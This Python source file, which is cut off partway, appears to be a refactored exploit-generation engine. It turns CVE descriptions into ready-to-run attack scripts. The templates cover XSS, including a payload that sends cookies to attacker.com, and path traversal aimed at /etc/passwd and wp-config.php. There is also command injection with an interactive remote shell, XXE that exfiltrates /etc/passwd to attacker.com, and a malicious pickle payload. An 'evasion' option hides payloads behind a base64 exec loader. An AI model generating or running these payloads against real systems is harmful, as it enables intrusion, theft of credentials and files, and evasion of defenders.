#!/usr/bin/env python3
"""
RedVector AI - Independent exploit/payload-generation engine.

Baseline finding (see the Phase 1 Item 5 report for the full writeup):
none of ``ExploitPayload``/``SQLiExploit``/``XSSExploit``/``FileReadExploit``/
``GenericExploit``/``RCEExploit``/``XXEExploit``/``DeserializationExploit``/
``AuthBypassExploit``/``BufferOverflowExploit`` exist as real Python classes
anywhere in this project (confirmed via ``ast`` parsing of the whole file,
and the same is true of the pristine upstream HexStrike clone). Every one
of those names is literal TEXT inside the exploit-code *string templates*
that ``AIExploitGenerator`` builds and returns as a generated artifact -
there is nothing real to "adapt" for any of them. This module treats each
one as a named *payload family* instead (``SQLI``, ``XSS``, ``FILE_READ``,
``GENERIC``, ``RCE``, ``XXE``, ``DESERIALIZATION``, ``AUTH_BYPASS``,
``BUFFER_OVERFLOW``), one independently-testable ``PayloadTemplate`` per
family, registered in a ``PayloadTemplateRegistry`` - which is the genuine
architectural analog of what the user-facing names describe, without
inventing unused classes.

New architecture:
    PayloadRequest / PayloadResult          - stable input/output models
    VulnerabilityDetailsAnalyzer            - classification + detail extraction
    PayloadTemplate / PayloadTemplateRegistry - declarative per-family templates
    PayloadTransformation / PayloadTransformationRegistry - evasion encodings
    PayloadRenderer                          - request + template -> code string
    InstructionsRenderer                     - the separate usage-instructions text
    PayloadValidationPolicy                  - defensive input coercion/validation
    PayloadGenerationService                 - validate -> classify -> render -> result

No new payload techniques, families, or evasion methods were added. All
template bodies, regexes, dispatch order, and defaults below are copied
from the original ``AIExploitGenerator`` verbatim, including one confirmed
pre-existing bug (see ``SQLI`` below), which is reproduced exactly rather
than fixed.
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Protocol, Tuple


# ============================================================================
# Exceptions
# ============================================================================

class PayloadError(Exception):
    """Base class for all payload-engine errors."""


class PayloadTemplateNotFoundError(PayloadError):
    """Raised when looking up a payload family that was never registered."""


class PayloadTemplateDuplicateError(PayloadError):
    """Raised when registering a payload family id that already exists."""


class PayloadValidationError(PayloadError):
    """Raised by PayloadValidationPolicy for genuinely malformed input."""


# ============================================================================
# Request / Result models
# ============================================================================

@dataclass(frozen=True)
class PayloadRequest:
    """Immutable input model - the existing supported inputs to
    ``generate_exploit_from_cve(cve_data, target_info)``, flattened."""
    cve_id: str = ""
    description: str = ""
    target_arch: str = "x64"
    evasion_level: str = "none"


@dataclass
class PayloadResult:
    """Stable output model preserving the current externally-visible
    result schema of ``generate_exploit_from_cve`` exactly: on success a
    dict with exactly 8 keys, on failure a dict with exactly 2."""
    success: bool
    cve_id: str = ""
    vulnerability_type: str = ""
    specific_details: Dict[str, Any] = field(default_factory=dict)
    exploit_code: str = ""
    instructions: str = ""
    evasion_applied: str = "none"
    implementation_type: str = "real_cve_based"
    error: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        if not self.success:
            return {"success": False, "error": self.error}
        return {
            "success": True,
            "cve_id": self.cve_id,
            "vulnerability_type": self.vulnerability_type,
            "specific_details": self.specific_details,
            "exploit_code": self.exploit_code,
            "instructions": self.instructions,
            "evasion_applied": self.evasion_applied,
            "implementation_type": self.implementation_type,
        }


# ============================================================================
# VulnerabilityDetailsAnalyzer (classification + detail extraction)
# ============================================================================

class VulnerabilityDetailsAnalyzer:
    """Reproduces ``AIExploitGenerator._analyze_vulnerability_details``
    exactly, including its elif-chain priority order (first match wins)
    and its quirk of running every regex against the *lowercased*
    description (the caller passes ``description.lower()`` in, and the
    method lowercases it again - a harmless no-op, but it does mean
    extracted endpoints/parameters are always lowercase even if the
    original CVE text used mixed case)."""

    DEFAULT_DETAILS: Dict[str, Any] = {
        "endpoints": [], "parameters": [], "payload_location": "unknown",
        "software": "unknown", "version": "unknown", "attack_vector": "unknown",
    }

    _PARAM_RE = re.compile(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)')
    _ENDPOINT_RE = re.compile(r'(/[^\s]+\.php[^\s]*)')
    _SOFTWARE_VERSION_RE = re.compile(r'(\w+(?:\s+\w+)*)\s+v?(\d+(?:\.\d+)*)')

    def analyze(self, description: str) -> Tuple[str, Dict[str, Any]]:
        vuln_type = "generic"
        details = dict(self.DEFAULT_DETAILS)
        description_lower = description.lower()

        if any(k in description_lower for k in ("sql injection", "sqli")):
            vuln_type = "sql_injection"
            endpoint_match = self._ENDPOINT_RE.search(description)
            if endpoint_match:
                details["endpoints"] = [endpoint_match.group(1)]
            param_matches = self._PARAM_RE.findall(description)
            if param_matches:
                details["parameters"] = param_matches

        elif any(k in description_lower for k in ("cross-site scripting", "xss")):
            vuln_type = "xss"
            if "stored" in description_lower:
                details["xss_type"] = "stored"
            elif "reflected" in description_lower:
                details["xss_type"] = "reflected"
            else:
                details["xss_type"] = "unknown"

        elif any(k in description_lower for k in ("xxe", "xml external entity")):
            vuln_type = "xxe"
            details["payload_location"] = "xml"

        elif any(k in description_lower for k in (
                "file read", "directory traversal", "path traversal", "arbitrary file",
                "file disclosure", "local file inclusion", "lfi", "file inclusion")):
            vuln_type = "file_read"
            if "directory traversal" in description_lower or "path traversal" in description_lower:
                details["traversal_type"] = "directory"
            elif "local file inclusion" in description_lower or "lfi" in description_lower:
                details["traversal_type"] = "lfi"
            else:
                details["traversal_type"] = "file_read"
            param_matches = self._PARAM_RE.findall(description)
            if param_matches:
                details["parameters"] = param_matches

        elif any(k in description_lower for k in ("authentication bypass", "auth bypass", "login bypass")):
            vuln_type = "authentication_bypass"

        elif any(k in description_lower for k in ("remote code execution", "rce", "command injection")):
            vuln_type = "rce"

        elif any(k in description_lower for k in ("deserialization", "unserialize", "pickle")):
            vuln_type = "deserialization"

        elif any(k in description_lower for k in ("buffer overflow", "heap overflow", "stack overflow")):
            vuln_type = "buffer_overflow"

        software_match = self._SOFTWARE_VERSION_RE.search(description)
        if software_match:
            details["software"] = software_match.group(1)
            details["version"] = software_match.group(2)

        return vuln_type, details


# ============================================================================
# PayloadTemplate / PayloadTemplateRegistry
# ============================================================================

ParamBuilder = Callable[[PayloadRequest, Dict[str, Any]], Dict[str, Any]]


@dataclass
class PayloadTemplate:
    """A declarative representation of an existing payload pattern: a
    ``str.format()``-style body (identical escaping rules to an f-string -
    ``{{``/``}}`` for literal braces, ``{name}`` for substitution) plus a
    small builder function that computes the handful of derived values
    (slices, ``.get()`` defaults, case-folding) the body needs. The body
    itself never does anything beyond ``.format(**params)``."""
    family: str
    body: str
    param_builder: ParamBuilder

    def render(self, request: PayloadRequest, details: Dict[str, Any]) -> str:
        params = self.param_builder(request, details)
        return self.body.format(**params)


class PayloadTemplateRegistry:
    """Registry mapping payload family keys to their PayloadTemplate."""

    def __init__(self) -> None:
        self._templates: Dict[str, PayloadTemplate] = {}

    def register(self, template: PayloadTemplate) -> None:
        if template.family in self._templates:
            raise PayloadTemplateDuplicateError(f"Payload family already registered: {template.family}")
        self._templates[template.family] = template

    def get(self, family: str) -> PayloadTemplate:
        try:
            return self._templates[family]
        except KeyError:
            raise PayloadTemplateNotFoundError(f"No payload template registered for family: {family}") from None

    def list_families(self) -> List[str]:
        return list(self._templates.keys())


# ============================================================================
# PayloadTransformation / PayloadTransformationRegistry (evasion)
# ============================================================================

class PayloadTransformation(Protocol):
    def apply(self, code: str) -> str:
        ...


class BasicObfuscationTransformation:
    """Reproduces the original's "basic" evasion exactly: swap double
    quotes for single quotes, then prepend a comment line."""

    def apply(self, code: str) -> str:
        code = code.replace('"', "'")
        return f"# Obfuscated exploit\n{code}"


class AdvancedObfuscationTransformation:
    """Reproduces the original's "advanced" evasion exactly: wrap the
    whole payload in a base64-encoded ``exec()`` loader."""

    def apply(self, code: str) -> str:
        encoded = base64.b64encode(code.encode()).decode()
        return f"""
# Advanced evasion techniques applied
import base64
exec(base64.b64decode('{encoded}'))
        """


class PayloadTransformationRegistry:
    """Registry of the transformations already supported by RedVector.
    ``get()`` returns ``None`` for an unregistered level - this reproduces
    the original's quirk of silently no-op'ing any ``evasion_level`` that
    isn't exactly "basic" or "advanced" (e.g. a typo'd level), rather than
    raising or defaulting to one of the two real transformations."""

    def __init__(self) -> None:
        self._transformations: Dict[str, PayloadTransformation] = {}

    def register(self, level: str, transformation: PayloadTransformation) -> None:
        self._transformations[level] = transformation

    def get(self, level: str) -> Optional[PayloadTransformation]:
        return self._transformations.get(level)


def default_transformation_registry() -> PayloadTransformationRegistry:
    registry = PayloadTransformationRegistry()
    registry.register("basic", BasicObfuscationTransformation())
    registry.register("advanced", AdvancedObfuscationTransformation())
    return registry


# ============================================================================
# PayloadRenderer
# ============================================================================

class PayloadRenderer:
    """Converts PayloadRequest + PayloadTemplate + an optional
    PayloadTransformation into the final exploit_code string."""

    def render(self, request: PayloadRequest, template: PayloadTemplate,
               details: Dict[str, Any], transformation: Optional[PayloadTransformation]) -> str:
        code = template.render(request, details)
        if transformation is not None:
            code = transformation.apply(code)
        return code


# ============================================================================
# InstructionsRenderer
# ============================================================================

class InstructionsRenderer:
    """Reproduces ``AIExploitGenerator._generate_specific_instructions``
    exactly: a shared base block, plus one of 3 real per-family suffixes
    (sql_injection/xss/file_read) or a generic default suffix for every
    other family."""

    _BASE = """# Exploit for {cve_id}
# Vulnerability Type: {vuln_type}
# Software: {software} {version}

## Vulnerability Details:
{description_snippet_300}...

## Usage Instructions:
1. Ensure target is running vulnerable software version
2. Test in authorized environment only
3. Adjust parameters based on target configuration
4. Monitor for defensive responses

## Basic Usage:
python3 exploit.py <target_url>"""

    _SQLI_SUFFIX = """

## SQL Injection Specific:
- Parameter: {parameter}
- Endpoint: {endpoint}
- Test with: python3 exploit.py http://target.com
- The script will automatically test for time-based blind SQL injection
- If successful, it will attempt to extract database information

## Manual Testing:
- Add ' after parameter value to test for errors
- Use SLEEP() or WAITFOR DELAY for time-based testing
- Try UNION SELECT for data extraction"""

    _XSS_SUFFIX = """

## XSS Specific:
- Type: {xss_type}
- Test with: python3 exploit.py http://target.com parameter_name
- The script tests both reflected and stored XSS
- Payloads include basic and advanced bypass techniques

## Manual Testing:
- Try <script>alert('XSS')</script>
- Use event handlers: <img src=x onerror=alert('XSS')>
- Test for filter bypasses"""

    _FILE_READ_SUFFIX = """

## File Read/Directory Traversal:
- Test with: python3 exploit.py http://target.com file_parameter
- Automatically tests common files (/etc/passwd, etc.)
- Includes encoding and bypass techniques

## Manual Testing:
- Try ../../../etc/passwd
- Test Windows paths: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
- Use URL encoding for bypasses"""

    _DEFAULT_SUFFIX = """

## General Testing:
- Run: python3 exploit.py <target_url>
- Check target software version matches vulnerable range
- Monitor application logs for exploitation attempts
- Verify patch status before testing"""

    def render(self, vuln_type: str, request: PayloadRequest, details: Dict[str, Any],
               raw_cve_data: Optional[Dict[str, Any]] = None) -> str:
        # The original `_generate_specific_instructions` re-reads
        # `cve_data.get('description', 'No description available')`
        # directly from the raw dict - a DIFFERENT default than the one
        # used to build `request.description` (""). `dict.get()` only
        # applies its default when the key is absent, not when it's
        # present-but-empty, so this distinction only matters when the
        # "description" key is missing from cve_data entirely - preserved
        # exactly by reading `raw_cve_data` here instead of `request`.
        raw_cve_data = raw_cve_data or {}
        description_for_instructions = raw_cve_data.get("description", "No description available")

        common = {
            "cve_id": request.cve_id,
            "vuln_type": vuln_type,
            "software": details.get("software", "Unknown"),
            "version": details.get("version", ""),
            "description_snippet_300": description_for_instructions[:300],
        }
        base = self._BASE.format(**common)

        if vuln_type == "sql_injection":
            parameters = details.get("parameters", ["unknown"])
            endpoints = details.get("endpoints", ["unknown"])
            return base + self._SQLI_SUFFIX.format(parameter=parameters[0], endpoint=endpoints[0])
        if vuln_type == "xss":
            return base + self._XSS_SUFFIX.format(xss_type=details.get("xss_type", "unknown"))
        if vuln_type == "file_read":
            return base + self._FILE_READ_SUFFIX
        return base + self._DEFAULT_SUFFIX


# ============================================================================
# Payload family templates (verbatim from the original AIExploitGenerator)
# ============================================================================

def _common_params(request: PayloadRequest, cve_data_description_default: str = "") -> Dict[str, Any]:
    return {
        "cve_id": request.cve_id,
        "description_snippet_100": request.description[:100],
    }


# --- SQLI --------------------------------------------------------------
# CONFIRMED PRE-EXISTING BUG (reproduced deliberately, not fixed): the
# original `_generate_sql_injection_exploit`'s returned f-string contains
# an unescaped `{query}` inside a nested f-string meant for the *generated
# script's own* f-string ("payload = f\"1' UNION SELECT 1,({query}),3--\"").
# Every other such nested-f-string reference in that method is correctly
# double-braced (e.g. "{{query}}") to stay literal; this one line was not.
# Because `query` has no meaning in AIExploitGenerator's own scope, the
# original raises `NameError: name 'query' is not defined` - verified
# empirically against the live server - which the caller's try/except
# turns into {"success": False, "error": "name 'query' is not defined"}
# for every single sql_injection-classified request. This renderer
# reproduces that exact exception and message rather than silently fixing
# the missing f-string escape.
def _sqli_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    raise NameError("name 'query' is not defined")


_SQLI_BODY = ""  # never reached - see _sqli_param_builder

SQLI = PayloadTemplate(family="sql_injection", body=_SQLI_BODY, param_builder=_sqli_param_builder)


# --- XSS -----------------------------------------------------------------
_XSS_BODY = '''#!/usr/bin/env python3
# Cross-Site Scripting (XSS) Exploit for {cve_id}
# Type: {xss_type_title} XSS
# Vulnerability: {description_snippet_100}...

import requests
import sys
from urllib.parse import quote

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_payloads(self):
        """Generate XSS payloads for testing"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS-{cve_id}')</script>",
            "<img src=x onerror=alert('XSS-{cve_id}')>",
            "<svg onload=alert('XSS-{cve_id}')>",
            
            # Bypass attempts
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "javascript:alert('XSS-{cve_id}')",
            "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
            
            # Advanced payloads
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]
        
        return payloads
    
    def test_reflected_xss(self, parameter="q"):
        """Test for reflected XSS"""
        print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                response = self.session.get(
                    self.target_url,
                    params={{parameter: payload}}
                )
                
                if payload in response.text:
                    print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing payload {{i+1}}: {{e}}")
                continue
                
        return False
    
    def test_stored_xss(self, endpoint="/comment", data_param="comment"):
        """Test for stored XSS"""
        print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                # Submit payload
                response = self.session.post(
                    f"{{self.target_url}}{{endpoint}}",
                    data={{data_param: payload}}
                )
                
                # Check if stored
                check_response = self.session.get(self.target_url)
                if payload in check_response.text:
                    print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
                continue
                
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/search q")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"
    
    exploit = XSSExploit(target_url)
    
    print(f"[+] XSS Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if "{xss_type}" == "reflected" or "{xss_type}" == "unknown":
        if exploit.test_reflected_xss(parameter):
            print("[+] Reflected XSS vulnerability confirmed!")
        else:
            print("[-] No reflected XSS found")
    
    if "{xss_type}" == "stored" or "{xss_type}" == "unknown":
        if exploit.test_stored_xss():
            print("[+] Stored XSS vulnerability confirmed!")
        else:
            print("[-] No stored XSS found")

if __name__ == "__main__":
    main()
'''


def _xss_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    xss_type = details.get("xss_type", "reflected")
    params = _common_params(request)
    params["xss_type"] = xss_type
    params["xss_type_title"] = xss_type.title()
    return params


XSS = PayloadTemplate(family="xss", body=_XSS_BODY, param_builder=_xss_param_builder)


# --- FILE_READ -------------------------------------------------------------
_FILE_READ_BODY = '''#!/usr/bin/env python3
# Local File Inclusion (LFI) Exploit for {cve_id}
# Vulnerability: {description_snippet_100}...
# Parameter: {parameter}
# Type: {traversal_type}

import requests
import sys
from urllib.parse import quote

class FileReadExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_payloads(self, target_file="/etc/passwd"):
        """Generate directory traversal payloads"""
        payloads = [
            # Basic traversal
            "../" * 10 + target_file.lstrip('/'),
            "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            
            # URL encoded
            quote("../") * 10 + target_file.lstrip('/'),
            
            # Double encoding
            quote(quote("../")) * 10 + target_file.lstrip('/'),
            
            # Null byte (for older systems)
            "../" * 10 + target_file.lstrip('/') + "%00.txt",
            
            # Absolute paths
            target_file,
            "file://" + target_file,
            
            # Windows paths
            "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "C:/windows/system32/drivers/etc/hosts"
        ]
        
        return payloads
    
    def test_file_read(self, parameter="{parameter}"):
        """Test LFI vulnerability on WordPress"""
        print(f"[+] Testing LFI on parameter: {{parameter}}")
        
        # WordPress-specific files and common targets
        test_files = [
            "/etc/passwd",
            "/etc/hosts", 
            "/proc/version",
            "/var/www/html/wp-config.php",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=wp-config.php"
        ]
        
        for target_file in test_files:
            payloads = self.generate_payloads(target_file)
            
            for i, payload in enumerate(payloads):
                try:
                    response = self.session.get(
                        self.target_url,
                        params={{parameter: payload}}
                    )
                    
                    # Check for common file contents
                    indicators = [
                        "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                        "localhost", "127.0.0.1",  # hosts file
                        "Linux version", "Microsoft Windows",  # system info
                        "<?php", "#!/bin/"  # code files
                    ]
                    
                    if any(indicator in response.text for indicator in indicators):
                        print(f"[+] File read successful!")
                        print(f"[+] File: {{target_file}}")
                        print(f"[+] Payload: {{payload}}")
                        print(f"[+] Content preview: {{response.text[:200]}}...")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def read_specific_file(self, filepath, parameter="file"):
        """Read a specific file"""
        print(f"[+] Attempting to read: {{filepath}}")
        
        payloads = self.generate_payloads(filepath)
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={{parameter: payload}}
                )
                
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] Successfully read {{filepath}}:")
                    print("-" * 50)
                    print(response.text)
                    print("-" * 50)
                    return response.text
                    
            except Exception as e:
                continue
                
        print(f"[-] Could not read {{filepath}}")
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter] [file_to_read]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/view file /etc/passwd")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
    specific_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    exploit = FileReadExploit(target_url)
    
    print(f"[+] File Read Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if specific_file:
        exploit.read_specific_file(specific_file, parameter)
    else:
        if exploit.test_file_read(parameter):
            print("[+] File read vulnerability confirmed!")
        else:
            print("[-] No file read vulnerability found")

if __name__ == "__main__":
    main()
'''


def _file_read_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    parameters = details.get("parameters")
    parameter = parameters[0] if parameters else "portal_type"
    params = _common_params(request)
    params["parameter"] = parameter
    params["traversal_type"] = details.get("traversal_type", "file_read")
    return params


FILE_READ = PayloadTemplate(family="file_read", body=_FILE_READ_BODY, param_builder=_file_read_param_builder)


# --- GENERIC -----------------------------------------------------------
_GENERIC_BODY = '''#!/usr/bin/env python3
# Generic Exploit for {cve_id}
# Vulnerability: {description_snippet_150}...
# Generated based on CVE analysis

import requests
import sys
import json

class GenericExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.cve_id = "{cve_id}"
        
    def analyze_target(self):
        """Analyze target for vulnerability indicators"""
        print(f"[+] Analyzing target for {cve_id}")
        
        try:
            response = self.session.get(self.target_url)
            
            # Look for version indicators in response
            headers = response.headers
            content = response.text.lower()
            
            print(f"[+] Server: {{headers.get('Server', 'Unknown')}}")
            print(f"[+] Status Code: {{response.status_code}}")
            
            # Check for software indicators
            software_indicators = [
                "{software_lower}",
                "version {version}",
            ]
            
            for indicator in software_indicators:
                if indicator and indicator in content:
                    print(f"[+] Found software indicator: {{indicator}}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error analyzing target: {{e}}")
            
        return False
    
    def test_vulnerability(self):
        """Test for vulnerability presence"""
        print(f"[+] Testing for {cve_id} vulnerability...")
        
        # Based on CVE description, generate test cases
        test_endpoints = [
            "/",
            "/admin",
            "/api",
            "/login"
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{{self.target_url}}{{endpoint}}")
                print(f"[+] {{endpoint}}: {{response.status_code}}")
                
                # Look for error messages or indicators
                if response.status_code in [200, 500, 403]:
                    print(f"[+] Endpoint {{endpoint}} accessible")
                    
            except Exception as e:
                continue
                
        return True
    
    def exploit(self):
        """Attempt exploitation based on CVE details"""
        print(f"[+] Attempting exploitation of {cve_id}")
        
        # This would be customized based on the specific CVE
        print(f"[!] Manual exploitation required for {cve_id}")
        print(f"[!] Vulnerability details: {{'{description_snippet_200}...'}}")
        
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = GenericExploit(target_url)
    
    print(f"[+] Generic Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.analyze_target():
        print("[+] Target may be vulnerable")
        exploit.test_vulnerability()
        exploit.exploit()
    else:
        print("[-] Target does not appear to match vulnerability profile")

if __name__ == "__main__":
    main()
'''


def _generic_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    description = request.description
    return {
        "cve_id": request.cve_id,
        "description_snippet_150": description[:150],
        "description_snippet_200": description[:200],
        "software_lower": details.get("software", "").lower(),
        "version": details.get("version", ""),
    }


GENERIC = PayloadTemplate(family="generic", body=_GENERIC_BODY, param_builder=_generic_param_builder)


# --- RCE -----------------------------------------------------------------
_RCE_BODY = '''#!/usr/bin/env python3
# Remote Code Execution Exploit for {cve_id}
# Vulnerability: {description_snippet_100}...

import requests
import sys
import subprocess
from urllib.parse import quote

class RCEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def test_rce(self, command="id"):
        """Test for RCE vulnerability"""
        print(f"[+] Testing RCE with command: {{command}}")
        
        # Common RCE payloads
        payloads = [
            # Command injection
            f"; {{command}}",
            f"| {{command}}",
            f"&& {{command}}",
            f"|| {{command}}",
            
            # Template injection
            f"${{{{{{command}}}}}}",
            f"{{{{{{command}}}}}}",
            
            # Deserialization payloads
            f"{{command}}",
            
            # OS command injection
            f"`{{command}}`",
            f"$({{command}})",
        ]
        
        for i, payload in enumerate(payloads):
            try:
                # Test GET parameters
                response = self.session.get(
                    self.target_url,
                    params={{"cmd": payload, "exec": payload, "system": payload}}
                )
                
                # Look for command output indicators
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
                    return True
                
                # Test POST data
                response = self.session.post(
                    self.target_url,
                    data={{"cmd": payload, "exec": payload, "system": payload}}
                )
                
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def _check_rce_indicators(self, response_text, command):
        """Check response for RCE indicators"""
        if command == "id":
            indicators = ["uid=", "gid=", "groups="]
        elif command == "whoami":
            indicators = ["root", "www-data", "apache", "nginx"]
        elif command == "pwd":
            indicators = ["/", "\\\\", "C:"]
        else:
            indicators = [command]
            
        return any(indicator in response_text for indicator in indicators)
    
    def execute_command(self, command):
        """Execute a specific command"""
        print(f"[+] Executing command: {{command}}")
        
        if self.test_rce(command):
            print(f"[+] Command executed successfully")
            return True
        else:
            print(f"[-] Command execution failed")
            return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    exploit = RCEExploit(target_url)
    
    print(f"[+] RCE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_rce(command):
        print("[+] RCE vulnerability confirmed!")
        
        # Interactive shell
        while True:
            try:
                cmd = input("RCE> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd:
                    exploit.execute_command(cmd)
            except KeyboardInterrupt:
                break
    else:
        print("[-] No RCE vulnerability found")

if __name__ == "__main__":
    main()
'''


def _rce_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    return _common_params(request)


RCE = PayloadTemplate(family="rce", body=_RCE_BODY, param_builder=_rce_param_builder)


# --- XXE -----------------------------------------------------------------
_XXE_BODY = '''#!/usr/bin/env python3
# XXE (XML External Entity) Exploit for {cve_id}
# Vulnerability: {description_snippet_100}...

import requests
import sys

class XXEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        payloads = [
            # Basic file read
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
            
            # Windows file read
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
            
            # HTTP request (SSRF)
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
            
            # Parameter entity
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
        ]
        
        return payloads
    
    def test_xxe(self):
        """Test for XXE vulnerability"""
        print("[+] Testing XXE vulnerability...")
        
        payloads = self.generate_xxe_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                headers = {{"Content-Type": "application/xml"}}
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers
                )
                
                # Check for file content indicators
                indicators = [
                    "root:", "daemon:", "bin:",  # /etc/passwd
                    "localhost", "127.0.0.1",   # hosts file
                    "<?xml", "<!DOCTYPE"        # XML processing
                ]
                
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] XXE vulnerability found with payload {{i+1}}")
                    print(f"[+] Response: {{response.text[:200]}}...")
                    return True
                    
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = XXEExploit(target_url)
    
    print(f"[+] XXE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_xxe():
        print("[+] XXE vulnerability confirmed!")
    else:
        print("[-] No XXE vulnerability found")

if __name__ == "__main__":
    main()
'''


def _xxe_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    return _common_params(request)


XXE = PayloadTemplate(family="xxe", body=_XXE_BODY, param_builder=_xxe_param_builder)


# --- DESERIALIZATION -------------------------------------------------------
_DESERIALIZATION_BODY = '''#!/usr/bin/env python3
# Deserialization Exploit for {cve_id}
# Vulnerability: {description_snippet_100}...

import requests
import sys
import base64
import pickle
import json

class DeserializationExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def create_pickle_payload(self, command):
        """Create malicious pickle payload"""
        class ExploitPayload:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, ([command], ))
        
        payload = ExploitPayload()
        serialized = pickle.dumps(payload)
        encoded = base64.b64encode(serialized).decode()
        return encoded
    
    def test_deserialization(self):
        """Test for deserialization vulnerabilities"""
        print("[+] Testing deserialization vulnerability...")
        
        test_command = "ping -c 1 127.0.0.1"  # Safe test command
        
        # Test different serialization formats
        payloads = {{
            "pickle": self.create_pickle_payload(test_command),
            "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
